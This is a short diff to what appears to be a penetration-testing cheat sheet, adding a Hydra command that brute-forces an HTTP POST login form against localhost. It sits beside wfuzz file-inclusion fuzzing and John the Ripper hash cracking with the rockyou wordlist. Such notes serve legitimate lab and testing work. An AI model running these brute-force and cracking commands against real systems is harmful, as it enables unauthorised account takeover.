@@ -24,3 +24,7 @@ wfuzz -w lfi-list.txt  --hh 0  'http://127.0.0.1/index.php?FUZZ=test'
 ```console
 john hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
+## Hydra [post]
+```console
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"
+```
